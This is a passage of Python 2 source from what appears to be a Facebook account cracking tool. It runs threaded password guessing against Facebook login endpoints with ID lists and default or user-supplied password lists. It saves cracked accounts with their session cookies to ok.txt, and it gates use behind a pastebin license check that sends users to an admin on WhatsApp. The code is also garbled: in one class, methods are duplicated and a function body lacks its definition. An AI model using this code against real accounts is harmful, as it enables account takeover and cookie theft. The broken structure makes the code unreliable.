					print ("   %s"%e)
					continue
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
		try:
			for i in fl.get("pw"):
				log=graph_fb(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   \033[0;93m[CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
			
def spt():
	try:
		toket = open('licensed.log','r').read()
	except IOError:
		print("\x1b[91m  License Invalid\x1b[0m !");time.sleep(2)
		os.system('clear')
		os.system('rm -rf licensed.log')
		user()
	if os.path.exists('licensed.log'): #dev/anggaxd
		user1()
	else:
		user()
def user():
    os.system('clear')
    banner()
    print(45*"_")
    print ('  [+]Generating ID ...');time.sleep(3)
    print ("  [+]SUCCES");time.sleep(0.07)
    id = uuid.uuid4().hex[:25] ## hex 20 change to 25
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    print ("  [+]YOUR ID : "+ id);time.sleep(0.07)
    print ('  [+]Your ID Has Not Been Confirmed');time.sleep(0.07)
    print ('  [+]Please Contact Admin for ID Confirmation');time.sleep(0.07)
    input ('  Press Enter to Chat Admin');time.sleep(0.07)
    os.system('am start https://wa.me/6289625664339?text=Konfirmasi%20Saya%20Dengan%20ID:%20' + id + ' >/dev/null')
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
      j = open('licensed.log', 'r').read()
      r = requests.get("https://pastebin.com/raw/8XWiYXye").text
      if j in r:
          os.system("clear")
          banner()
          print("  Login Status : \x1b[92mComplete\x1b[0m")
          time.sleep(1)
          return
      else:
          os.system("clear")
          banner()
          print ('  [!]Login Status :\x1b[91m Failed \x1b[0m');time.sleep(0.07)
          print ('  [+]ID Not Confirmed');time.sleep(0.07)
          print ('  [+]Please Chat Admin For Confirmed Your ID');time.sleep(0.07)
          input ('  Press Enter To Chat Admin');time.sleep(0.07)
          os.system('am start https://wa.me/6289625664339?text=Tolong%20konfirmasi%20saya%20dengan%20ID:%20' + j + ' >/dev/null')
          os.sys.exit()
    except requests.exceptions.ConnectionError:
      print ('  \x1b[91mNo Connection')
      input('  \x1b[0m Back')
      spt()
    except KeyboardInterrupt:
      os.sys.exit()
    except IOError:
      subprocess.Popen(['rm', '-rf', 'licensed.log'])
      user()
if __name__=='__main__':
  basecookie()
  menu()
